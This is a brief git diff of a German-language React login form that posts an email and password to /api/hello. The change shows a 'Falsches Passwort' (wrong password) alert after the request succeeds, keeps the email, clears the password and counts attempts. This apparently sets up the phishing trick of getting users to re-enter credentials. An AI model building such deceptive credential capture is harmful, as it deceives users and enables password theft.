@@ -80,8 +80,8 @@ export default function Main() {
     axios
       .post("/api/hello", data)
       .then((req) => {
-        setCredentials({ email: "", passwort: "" });
-        window.alert("Erfolg!!!");
+        setCredentials({ ...credentials, passwort: "" });
+        window.alert("Falsches Passwort");
 
         setCount((prev) => prev + 1);
       })
